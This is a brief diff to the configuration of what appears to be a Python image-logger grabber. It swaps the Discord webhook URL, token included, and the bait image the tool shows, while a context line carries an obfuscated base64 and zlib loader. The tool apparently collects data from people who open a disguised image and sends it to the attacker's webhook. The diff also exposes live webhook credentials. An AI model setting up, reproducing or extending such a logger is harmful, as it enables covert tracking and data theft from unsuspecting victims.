@@ -4,8 +4,8 @@ _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1427736804697833522/EDXIMWAF-IbFZJYSQG5hTpidvxiXqfa3t0qSKzySqJKdPSUJDnUDNsbda5OgvDr0mhVO",
-    "image": "https://pkmncards.com/wp-content/uploads/charizard-ex-xy-promos-xy17-ptcgo-1.png",
+    "webhook": "https://discord.com/api/webhooks/1418902069984759868/QeEnBq9MY1Krb1eWER3P7NPDwhJK8QoqZVjHJVkWWxiJhsgNkO-Hv3FbOQ9JlCrKU8nH",
+    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT3qf2olTPDXiwEJFQqg8nT8P62-iPA1NO6kA&s",
     "imageArgument": True,
     "username": "TrackOrd",
     "avatar_url": "https://github.com/mystixxx2/Image/blob/main/ChatGPT%20Image%2011%20oct.%202025,%2018_54_21.png?raw=true",
